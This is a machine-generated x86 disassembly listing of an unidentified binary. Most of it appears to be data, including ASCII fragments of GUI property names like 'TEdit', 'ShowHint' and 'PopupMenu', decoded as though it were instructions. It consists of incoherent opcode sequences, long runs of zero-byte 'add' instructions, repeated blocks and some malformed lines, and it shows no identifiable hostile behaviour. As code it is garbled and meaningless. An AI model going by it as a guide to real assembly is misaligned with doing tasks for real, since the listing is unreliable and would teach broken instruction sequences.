add [ eax ] bl
sbb [ eax + eax + 0x54 ] al
sbb al [ eax + eax + 0x10 ]
sbb al [ eax + eax - 0x44 ]
sbb eax [ eax + eax - 0x7c ]
sbb al [ eax + eax + 0x34 ]
sbb al [ eax + eax - 0x18 ]
sbb al [ eax + eax + 0x20 ]
sbb eax [ eax + eax + 0x5 ]
push esp
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
add eax 0x69644554
je r-xdata
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
jo r-xdata
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x61437261
jae r-xdata
arpl [ gs : esi + 0x6f ] cx
jb r-xdata
dec esp
popad
jbe r-xdata
or [ ecx ] al
inc ebp
add al dh
add eax 0xc7880045
inc esp
add [ esi + ecx * 8 ] bl
inc esp
add [ ebx + ebx * 8 + 0x1c580044 ] bh
inc esp
add [ ebx + 0x1d840044 ] dl
inc esp
add [ esp + ebx * 8 + 0x44 ] dl
add [ eax - 0x24 ] bl
inc esp
inc ebx
add ah dh
int1
inc ebx
add [ ecx ] al
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0xd ] dh
pop ds
inc esp
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ebp + eax * 8 + 0x44 ] ch
add al dh
adc [ ebp ] eax
add [ eax + 0x4c004033 ] bl
outsd
insd
inc ebp
imul esi [ fs : esp + ecx * 8 - 0x10 ] 0x61d40043
inc esp
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc edx
add [ eax - 0x6fffbfcd ] dl
cmp al 0x17
add [ eax ] eax
add [ eax ] al
add [ edx ] al
adc [ ebp ] eax
pop esp
fiadd [ eax + eax - 0x54 ]
insb
lds eax [ eax + eax - 0x10 ]
popad
insb
or esp [ ebp + 0x63 ]
push ebp
jo r-xdata
add [ eax ] al
add [ eax + esi * 8 ] dh
inc ebx
add [ eax ] cl
or al 0x54
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
bound eax [ ecx ]
add bh bh
xor [ eax * 2 + 0x100 ] dl
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
insb
jae r-xdata
pop esp
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax + 0x17 ] dh
inc esp
add [ ecx + 0x12200045 ] al
inc ebp
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add [ eax ] bh
sbb [ eax + eax + 0x28 ] al
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
[ ebp ] eax
insb
jae r-xdata
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
add [ esp + edx ] bh
add [ ebx + ecx * 4 - 0x4123ffbf ] ch
jb r-xdata
or esp [ ebp + 0x63 ]
dec esp
outsd
ja r-xdata
jb r-xdata
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
add [ ecx ] 0x0
add [ eax ] al
or eax 0x75410a00
je r-xdata
add [ esi + ecx * 2 + 0x44 ] dl
add [ ecx ] ah
add bh bh
je r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax + 0x950ff00 ] ah
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax + 0x9 ]
pop esi
inc esp
popad
jae r-xdata
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
jb r-xdata
mov eax eax
int3
add [ eax ] al
adc eax 0x68430800
popad
jb r-xdata
insb
dec edi
jne r-xdata
str [ edx ]
inc edx
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
pop esp
inc esp
add [ ebx + 0x1 ] ah
outsb
outsb
jb r-xdata
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ edi ] cl
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
add [ eax ] dl
fild [ eax + eax + 0x28 ]
push ds
inc esp
add [ eax ] dh
pop es
inc ebp
add [ eax ] al
in eax 0x44
inc esp
add [ eax ] dl
xchg edx eax
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc esp
add [ eax + 0x20 ] al
inc esp
add al bh
pop ds
inc esp
add [ eax ] ah
and [ eax + eax + 0x7c ] al
and [ eax + eax - 0x4c ] al
and [ eax + eax + 0x28 ] al
pop ds
inc esp
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
inc [ edi + ebx + 0x1fc40044 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi * 8 + 0x43 ] bh
add [ eax ] al
inc ebp
add [ edx + ebx * 8 + 0x44 ] bl
adc [ edx ] al
cwde
xor eax [ eax ]
dec esp
pop ds
inc esp
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ebp + eax * 8 + 0x44 ] ch
add al dh
popad
jae r-xdata
jb r-xdata
popad
jae r-xdata
add bh bh
rcr [ edi - 0x6023ffbc ] 0x44
jb r-xdata
add [ eax + 0x42080013 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xac65646f
in eax dx
inc ebp
add [ edx + eax ] cl
add bh bh
dec esp
sbb [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
insb
dec ecx
pop ebp
inc esp
add [ ebp + 0x1 ] ah
pop esp
inc esp
add [ ecx + eax ] ah
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
add bh bh
in al dx
adc eax [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add al dh
xchg edx eax
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x5cff0001 ] ah
or [ ebp ] al
or [ eax ] 0x45
inc esp
adc al 0x47
add [ eax ] al
add [ eax ] al
add [ 0x16ff0000 ] 0x0
add eax 0x6f6c6f43
call 0x7044372b
add [ eax ] al
inc eax
lahf
inc esp
add ah bl
lahf
inc esp
jb r-xdata
insb
outsd
dec esi
inc esp
add [ eax + eax ] dh
push esp
retn 0x44
add bh bh
pushad
adc al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x65 ] eax
jbe r-xdata
push ebp
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
or eax [ ebx + 0x6f ]
jb r-xdata
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax + 0x17 ] dh
inc esp
add [ ecx + 0x12200045 ] al
inc ebp
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add [ eax ] bh
sbb [ eax + eax + 0x28 ] al
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
insb
jae r-xdata
add [ gs : eax ] dl
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
xor eax [ esp + edx + 0x47 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add dh bh
inc esp
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
je r-xdata
ror ah 0xf0
inc ebx
call [ edi + ebx * 4 ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
inc ebp
insb
xor al 0xf0
inc ebx
add [ ebx ] dl
add al [ eax ]
push [ eax + 0x18 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ eax ] al
adc [ edx ] eax
add bh bh
test [ eax ] bl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ds
add [ 0x65646948 ] cl
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
sub al 0x5c
inc esp
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
pop ds
add [ edi ] al
dec ecx
insd
dec ebp
outsd
mov esp 0x8800445c
add [ eax ] eax
dec [ eax + 0x1ff0001 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070020 ] al
insd
dec esi
popad
insd
cmp al 0x10
inc eax
add [ eax ] cl
add al [ eax ]
[ eax + 0x1004418 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
or [ ebp + 0x61 ] ecx
js r-xdata
inc esp
add [ edi + ebx * 4 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001d ] al
outsd
outsb
je r-xdata
add bh bh
adc al 0x9f
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
jmp esp
outsb
je r-xdata
outsd
dec ebp
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] dl
inc eax
add [ edx ] dl
add al [ eax ]
dec eax
sbb [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
or cl [ edi + 0x45 ]
dec ebp
inc ebx
outsd
outsb
jbe r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
inc esp
add [ eax ] dl
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push [ eax - 0x61 ]
sub al [ eax ]
or [ edx + 0x65 ] dl
popad
dec edi
outsb
insb
jns r-xdata
adc [ eax ] al
push cs
add al [ eax ]
call esp
sbb [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
outsd
jo r-xdata
outsb
je r-xdata
and eax 0x61500b00
adc [ eax ] al
test eax 0x8cff0001
or [ ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
dec ebp
inc esp
add [ eax + 0x38004508 ] bh
ja r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
jo r-xdata
inc ebp
add [ eax + eax ] bh
sub [ eax ] al
adc [ eax ] al
or eax 0x4cff0002
sbb [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
call [ eax + 0x9 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
or al 0x50
outsd
outsb
je r-xdata
add al 0x57
jb r-xdata
je r-xdata
jb r-xdata
popad
jae r-xdata
inc eax
add [ ecx ] bl
add bh bh
dec esp
lahf
inc esp
add [ ecx ] al
add [ eax ] al
xor eax [ eax + eax + 0x10 ]
jb r-xdata
add [ eax ] al
add [ 0x61500b00 ] ah
add [ eax ] ch
add [ eax + edx * 2 ] cl
inc esp
add [ eax ] bh
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002b ] al
je r-xdata
dec ebp
inc esp
add [ eax ] ah
sahf
inc esp
add [ eax - 0x62 ] dl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002d ] al
js r-xdata
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al 0x0
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
mov eax 0x38004508
outsb
jne r-xdata
adc [ eax ] al
0x94ff0000 0x449f
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
push 0x6948776f
outsb
add [ eax ] cl
push ebx
inc ebx
push 0x8e587261
add bh bh
mov esp 0x44be
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070030 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
push cs
dec edi
jo r-xdata
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0031 ] al
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08002f ] al
outsb
inc ebx
push 0x65676e61
add al 0x57
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
inc eax
popfd
inc esp
add [ esi + edi * 4 + 0x44 ] bl
add [ eax + 0x1 ] al
add [ cs : edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x4656c62
push edi
add [ eax ] al
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
dec esp
push eax
outsd
jo r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
add [ eax + 0x4f070037 ] al
add al 0x57
inc ecx
add al al
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
inc ebp
outsb
inc esp
jo r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0b00
jb r-xdata
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
outsb
inc ebp
js r-xdata
push edi
inc ecx
add al cl
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push edx
inc esp
add [ eax ] cl
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax ] eax
[ eax ]
push edi
inc ecx
add [ eax ] ch
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
loopne r-xdata
jo r-xdata
push eax
inc esp
loopne r-xdata
dec edi
mov eax 0xe000444f
add [ eax ] al
jmp eax
xchg esp eax
push eax
inc esp
add al ch
add [ eax ] eax
outsd
arpl [ ebx + 0x4c ] bp
push edx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
push eax
inc esp
add al bl
add [ eax ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
dec edi
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003c ] al
outsb
dec ebp
outsd
jne r-xdata
inc esp
add al ah
add [ eax ] eax
jmp eax
mov [ ecx ] ah
inc esp
add [ ebx + ebx * 4 ] bh
jb r-xdata
cld
inc ebx
add [ eax + eax ] dl
add [ eax ] al
mov esp 0x84004161
xor eax [ eax ]
nop
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
push ebp
jo r-xdata
outsb
push ebx
je r-xdata
arpl [ ebx + 0x4 ] bp
push edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
inc esp
outsd
ja r-xdata
add al 0xa2
inc ecx
add [ eax + 0x160041a2 ] bl
push esp
inc ebx
jne r-xdata
inc esp
add ah bl
popfd
inc ecx
add [ eax + 0x4800419e ] dh
sub [ eax ] eax
in al 0x9e
inc ecx
add [ edi + ebx * 4 ] dl
inc ecx
add [ eax - 0x61 ] ch
inc ecx
add [ eax ] dl
inc ecx
add [ ecx - 0x5dfbffbf ] ch
mov al [ 0x21640041 ]
inc esp
add [ eax - 0x5e ] ah
inc ecx
add al ch
mov [ 0x22980041 ] al
inc esp
add [ eax ] dh
movsb [ edi ] [ esi ]
inc ecx
add [ eax - 0x2bffbe6a ] dh
xchg esi eax
inc ecx
add al bh
xchg esi eax
inc ecx
add al ah
and [ eax + eax + 0x50 ] eax
and al [ eax + eax + 0x54 ]
0x9b480041 0x41
jo r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
je r-xdata
push esp
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add al bl
add [ eax ] al
xor [ eax + 0x44 ] dl
cmp al 0x17
je r-xdata
inc ecx
add al dl
and [ eax + eax - 0x14 ] al
and [ eax + eax - 0x64 ] al
fwait
inc ecx
add ah al
fwait
lea eax [ bx + si ]
cmp bl 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 8 ] bl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
adc [ esi - 0x736fffbf ] 0x41
add [ eax - 0x4fffbe68 ] bh
jb r-xdata
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add al dh
fwait
inc esp
add [ eax ] ch
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add ah bh
sub [ eax + eax + 0x5c ] eax
rol [ eax + eax + 0x50 ] 0x5
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
inc edx
add [ eax - 0x6fffbfcd ] dl
inc esp
add [ edi + edx ] bh
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
xchg edi eax
inc ecx
add [ eax + 0x3c004421 ] cl
add [ eax - 0x6fffbe6a ] al
mov [ ecx ] es
mov eax 0xb0004198
inc esp
outsd
add [ eax ] al
add [ eax ] al
test al 0xfd
inc ebx
add al bh
je r-xdata
xor eax [ eax ]
xchg esp eax
loop r-xdata
imul ebp [ esi + 0x67 ] 0xfc1c9073
inc ebx
add [ edi ] al
push ss
push esp
inc ebx
jne r-xdata
and eax [ eax + eax - 0x10 ]
adc [ ebp ] eax
pop esp
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
mov esp 0xf000442c
xchg edx eax
je r-xdata
add al al
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
adc [ edx ] al
cwde
je r-xdata
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
inc ecx
add [ esp + ebp - 0x6d0fffbc ] bh
imul ebp [ esi + 0x67 ] 0x43fb8073
add [ edx + 0x41 ] ah
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add ah cl
and al [ eax + eax + 0x4 ]
or eax 0x12200045
inc ebp
insb
jae r-xdata
std
inc ebx
add [ edx + eax ] ah
add ah ah
push 0x173c0044
add [ ebp - 0x367ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 8 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7ffbc03 ] ch
sub_43ee34
mov esp 0x44be
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
dec esp
push eax
outsd
jo r-xdata
je r-xdata
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
add [ eax + 0x4f0b002b ] al
mov eax 0xd000444f
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4c ] bp
push edx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
jo r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
xor [ eax + 0x44 ] dl
add al bl
add [ eax ] al
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push edx
inc esp
add [ eax ] cl
push ebx
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4 ] bp
push edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebp
jo r-xdata
add [ eax ] eax
[ eax ]
push edi
inc ecx
add [ eax ] ch
add al bh
int1
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 8 - 0xe19ffbd ] dh
jb r-xdata
add [ eax ] eax
push edi
inc ecx
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
add [ eax ] eax
inc [ eax + 0x1ff0001 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
outsb
dec ebp
outsd
jne r-xdata
push edi
inc ecx
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ eax ] bl
sbb [ eax + eax + 0x54 ] al
sbb al [ eax + eax + 0x10 ]
sbb al [ eax + eax - 0x44 ]
sbb eax [ eax + eax - 0x7c ]
sbb al [ eax + eax + 0x34 ]
sbb al [ eax + eax - 0x18 ]
sbb al [ eax + eax + 0x20 ]
sbb eax [ eax + eax + 0x8 ]
add [ eax ] dh
add [ eax ] dl
mov al 0x1a
mov al 0xe
mov al 0x11
mov ebp 0x7bb012
mov bl 0xff
test [ edi ] bl
inc esp
add ah al
pop ds
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
add [ edi + edx ] bh
and [ edx ] al
add [ eax ] al
and [ esi + 0x44 ] bl
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
inc ebp
outsb
inc ebx
add [ eax ] ah
add al [ eax ]
add [ eax + 0x3c0043f0 ] al
pop ss
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
dec esp
je r-xdata
inc ebx
add [ eax ] ah
add al [ eax ]
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
